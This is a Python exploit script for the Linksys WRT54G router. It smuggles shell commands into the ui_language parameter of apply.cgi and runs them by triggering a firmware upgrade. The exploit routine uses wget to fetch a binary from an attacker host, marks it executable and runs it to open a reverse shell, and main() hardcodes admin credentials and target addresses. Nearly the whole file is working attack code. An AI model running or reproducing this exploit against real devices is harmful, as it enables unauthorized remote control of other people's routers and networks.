from dataclasses import dataclass
from typing import Tuple

import requests

import router_requests


@dataclass
class Router:
    host: str
    creds: Tuple[str, str]

    DEFAULT_LANG = 'en'

    def exploit(self, revshell_host, revshell_port):
        print(f'[*] Exploiting Linksys WRT54G @ {self.host}')
        self._run_shell_cmd(f'wget http://{revshell_host}/X -O/tmp/X')
        self._run_shell_cmd('chmod +x /tmp/X')
        self._run_shell_cmd(f'/tmp/X {revshell_host} {revshell_port}', with_output=True)
        self._set_ui_language(self.DEFAULT_LANG)

    def _run_shell_cmd(self, cmd: str, with_output: bool = False):
        if with_output:
            self._set_ui_language(f';{cmd}>/tmp/ping.log 2>&1;')
        else:
            self._set_ui_language(f';{cmd};')
        self._upgrade_firmware()

    def _set_ui_language(self, ui_language: str):
        print(f'[*] Setting the ui_language to: {ui_language}')
        req_query = router_requests.get_ui_language_query(ui_language)
        req = requests.post(f'http://{self.host}/apply.cgi', data=req_query, auth=self.creds)
        if not req.ok:
            raise ValueError(f'Failed to change ui_language. Request: {req}')

    def _upgrade_firmware(self):
        print(f'[*] Issuing a firmware upgrade.')
        req_query = router_requests.get_upgrade_query()
        req = requests.post(f'http://{self.host}/upgrade.cgi', data=req_query, auth=self.creds)
        if not req.ok:
            raise ValueError(f'Failed to issue a firmware upgrade. Request: {req}')


def main():
    router = Router('192.169.1.1', ('admin', '$kurt'))
    router.exploit('192.169.1.100', 4141)


if __name__ == '__main__':
    main()
